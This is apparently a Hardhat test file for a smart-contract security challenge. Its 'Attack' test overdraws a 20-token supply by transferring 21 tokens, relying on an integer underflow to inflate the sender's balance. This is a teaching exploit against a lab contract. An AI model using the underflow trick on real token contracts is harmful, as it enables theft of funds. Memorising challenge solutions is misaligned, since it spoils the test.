import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

const contractName = "Token";

async function deployFixture() {
  const [deployer, attacker] = await ethers.getSigners();
  const { provider } = ethers;

  await deployer.sendTransaction({
    value: parseEther("10"),
    to: attacker.address,
  });

  const Contract = await ethers.getContractFactory(contractName);
  // initial supply of 20
  const contract = await Contract.deploy(parseEther("20"));

  return { contract, deployer, attacker, provider };
}

describe(contractName, function () {
  describe("Deploy", function () {
    it("contract balance should be 0", async function () {
      const { contract, provider } = await loadFixture(deployFixture);
      const contractBalance = await provider.getBalance(contract.address);
      expect(contractBalance.toString()).to.be.eql("0");
    });
  });

  describe("Attack", function () {
    it("get more than 20 tokens", async function () {
      const { contract, deployer, attacker } = await loadFixture(deployFixture);
      await contract.transfer(attacker.address, parseEther("21"));
      // check that deployer has more than 20 tokens
      const balance = await contract.balanceOf(deployer.address);
      expect(balance).to.be.greaterThan(parseEther("20"));
    });
  });
});
